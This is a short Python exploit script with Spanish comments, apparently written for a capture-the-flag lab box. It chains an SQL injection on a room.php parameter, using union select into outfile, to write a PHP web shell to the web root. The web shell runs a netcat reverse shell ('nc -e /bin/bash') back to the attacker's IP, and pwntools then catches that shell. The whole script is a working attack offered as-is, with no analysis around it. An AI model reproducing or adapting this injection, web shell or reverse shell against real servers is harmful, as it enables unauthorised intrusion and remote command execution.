#!/usr/bin/python3

import requests
import pdb
import signal
import threading
import sys
import time
from pwn import *

def def_handler(sig,frame):
    print("\n\n[!] Saliendo del script\n")
    sys.exit(1)

# ^C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
iplocal = "10.10.14.10"
createFile = '''http://10.10.10.143/room.php?cod=-1%20union%20select%201,2,3,%22%3C?php%20system(%27nc%20-e%20/bin/bash%20''' + iplocal  +  '''%20443%27);%20?%3E%22,5,6,7%20into%20outfile%20%22/var/www/html/pwned.php%22--%20-'''
execFile = "http://10.10.10.143/pwned.php"
lport = 443

def sqli():

    r = requests.get(createFile)
    r = requests.get(execFile)
   
    shell.interactive()
    
if __name__ == '__main__':

    try:
        threading.Thread(target=sqli, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
